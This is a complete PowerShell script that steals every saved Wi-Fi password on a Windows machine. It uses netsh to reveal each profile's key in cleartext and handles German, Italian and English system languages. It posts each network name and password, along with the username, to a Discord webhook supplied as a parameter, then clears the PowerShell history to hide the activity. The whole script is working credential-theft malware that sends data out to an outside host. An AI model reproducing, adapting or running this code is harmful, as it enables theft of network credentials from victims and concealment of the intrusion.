param(
    [string]$discord
)


[Console]::OutputEncoding = [System.Text.UTF8Encoding]::UTF8
$OutputEncoding = [System.Text.UTF8Encoding]::UTF8
chcp 65001 | Out-Null




# Determine system language
$language = (Get-Culture).TwoLetterISOLanguageName
#Write-Host "Uri: $discord"
switch ($language) {
    'de' { # German
        $userProfileString = "(?<=Profil für alle Benutzer\s+:\s).+"
        $keyContentString = "(?<=Schlüsselinhalt\s+:\s).+"
    }
    'it' { # Italian
        $userProfileString = '(?<=Tutti i profili utente\s+:\s).+'
        $keyContentString = '(?<=Contenuto chiave\s+:\s).+'
    }
    default { # Default to English if language is not supported
        $userProfileString = '(?<=All User Profile\s+:\s).+'
        $keyContentString = '(?<=Key Content\s+:\s).+'
    }
}
#Write-Host "User: $userProfileString"
netsh wlan show profile | Select-String $userProfileString | ForEach-Object {
    $wlan  = $_.Matches.Value.Trim()
    $passw = (netsh wlan show profile $wlan key=clear | Select-String $keyContentString).Matches.Value.Trim()

    $Body = @{
        'username' = $env:username + " | " + [string]$wlan
        'content' = [string]$passw
    }
$JsonBody = ($Body | ConvertTo-Json -Compress)
# Remove the comments if you want debug it
#    try {
    Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body $JsonBody
 #   } catch {
  #      Write-Host "Some err: $_"
   # }
}

# Clear the PowerShell command history
Clear-History
